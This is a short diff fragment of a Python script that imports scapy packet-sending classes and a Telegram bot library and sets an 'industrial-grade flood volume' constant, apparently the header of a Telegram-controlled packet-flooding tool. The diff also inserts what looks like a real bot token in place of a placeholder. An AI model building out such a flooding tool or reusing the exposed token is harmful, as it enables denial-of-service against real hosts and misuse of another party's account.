@@ -3,12 +3,12 @@ import subprocess
 import socket
 import sys
 import random
-import threading
+import threading  
 import time
 from scapy.all import IP, TCP, UDP, ICMP, send, raw
 from telebot import types
 
-TOKEN = "YOUR_ACTUAL_TOKEN"
+TOKEN = "5290854080:AAHUj4e-XhTAznkb0cG_iZ0QrbadT_9HY-8"
 ADMIN_CHAT_ID = YOUR_ACTUAL_ID
 MAX_PACKETS = 1000000  # Industrial-grade flood volume
 
